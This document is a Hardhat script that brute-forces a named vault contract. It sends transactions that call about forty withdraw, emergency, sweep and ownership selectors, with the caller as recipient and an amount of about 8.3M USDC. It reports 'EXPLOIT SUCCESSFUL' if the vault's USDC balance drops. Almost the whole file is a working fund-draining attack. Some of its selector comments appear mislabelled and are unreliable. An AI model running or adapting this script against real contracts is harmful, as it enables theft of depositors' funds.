const { ethers } = require("hardhat");

/**
 * @title Quick Backdoor Test
 * @notice Test known backdoor patterns from similar vaults
 * @dev Common patterns: emergency withdraw, owner withdraw, hidden admin
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [signer] = await ethers.getSigners();
  console.log("\nüîì TESTING COMMON BACKDOOR PATTERNS");
  console.log("=====================================");
  console.log("Signer:", signer.address);
  
  // Get current balance
  const USDC_ABI = ["function balanceOf(address) view returns (uint256)"];
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
  const vaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  console.log("Vault USDC:", ethers.formatUnits(vaultBalance, 6));
  
  // Common backdoor selectors from other exploits
  const backdoorSelectors = [
    "0x5c975abb", // pause() - common emergency pattern
    "0x8456cb59", // pause() variant
    "0x3f4ba83a", // unpause()
    "0xf3fef3a3", // withdraw(address,uint256) 
    "0x00f714ce", // withdrawETH(uint256,address)
    "0x205c2878", // withdrawTo(address,uint256)
    "0x9e281a98", // withdrawToken(address,uint256)
    "0xc2bc2efc", // emergencyWithdraw(address)
    "0xdb006a75", // emergencyExit(uint256)
    "0x0c7cfe86", // rescueToken(address,address,uint256)
    "0x5312ea8e", // emergencyWithdraw(uint256)
    "0x958e2d31", // emergencyTokenWithdraw(address,uint256)
    "0x7c1e1487", // adminWithdraw(address,uint256)
    "0x4e71d92d", // claim()
    "0xe63697c8", // claimRewards(uint256,address,uint256)
    "0x1e83409a", // claim(address)
    "0x4ce38b5f", // claim(address,uint256)
    "0xe9fad8ee", // exit()
    "0x2e1a7d4d", // withdraw(uint256)
    "0x69328dec", // harvest(address,uint256)
    "0x4641257d", // harvest()
    "0x853828b6", // withdrawAll()
    "0x0e2789dd", // withdrawAllETH()
    "0x0968f264", // withdrawRemainingBalance()
    "0x5fd8c710", // withdrawBalance()
    "0x12065fe0", // getBalance()
    "0x3ccfd60b", // withdraw()
    "0x51cff8d9", // withdraw(address)
    "0xf7260d3e", // widthdraw(address) - typo version
    "0x116191b6", // vault()
    "0x8da5cb5b", // owner()
    "0x893d20e8", // getOwner()
    "0xf2fde38b", // transferOwnership(address)
    "0x13af4035", // setOwner(address)
    "0xd7d93e1e", // Hidden withdraw variants
    "0xa69df4b5", // unlock()
    "0xd9caed12", // withdraw(address,address,uint256)
    "0x96834ad3", // withdrawTokens(uint256,address)
    "0x9f678cca", // drip()
    "0x38d52e0f", // asset()
    "0x6083e59a", // sweepToken(address)
    "0x01681a62", // sweep(address)
    "0x8980f11f", // recoverERC20(address,uint256)
  ];
  
  console.log(`\nüîç Testing ${backdoorSelectors.length} known backdoor patterns...`);
  
  for (const selector of backdoorSelectors) {
    process.stdout.write(`Testing ${selector}... `);
    
    try {
      // Try with different parameter patterns
      const patterns = [
        selector + "0000000000000000000000000000000000000000000000000000000000000000", // no params
        selector + 
          "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() + // token address
          "00000000000000000000000000000000000000000000000001f161421c8e0000", // 8.3M USDC
        selector + 
          "000000000000000000000000" + signer.address.slice(2).toLowerCase() + // recipient
          "00000000000000000000000000000000000000000000000001f161421c8e0000", // amount
        selector +
          "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() + // token
          "000000000000000000000000" + signer.address.slice(2).toLowerCase() + // recipient  
          "00000000000000000000000000000000000000000000000001f161421c8e0000", // amount
      ];
      
      for (const data of patterns) {
        const tx = await signer.sendTransaction({
          to: VAULT_ADDRESS,
          data: data,
          gasLimit: 500000
        });
        
        const receipt = await tx.wait();
        
        // Check if USDC moved
        const newBalance = await usdc.balanceOf(VAULT_ADDRESS);
        if (newBalance < vaultBalance) {
          console.log(`\n\nüéâ BACKDOOR FOUND! Selector: ${selector}`);
          console.log(`Extracted: ${ethers.formatUnits(vaultBalance - newBalance, 6)} USDC`);
          console.log(`Transaction: ${tx.hash}`);
          return selector;
        }
      }
      
      console.log("‚ùå");
    } catch (e) {
      // Silent fail, continue
      process.stdout.write("‚ùå\n");
    }
  }
  
  console.log("\n\nüòû No backdoor found in common patterns");
  console.log("The vault may use a custom selector");
}

main()
  .then(backdoor => {
    if (backdoor) {
      console.log("\nüîì EXPLOIT SUCCESSFUL!");
    }
  })
  .catch((error) => {
    console.error("\nüí• Script error:", error);
    process.exit(1);
  });
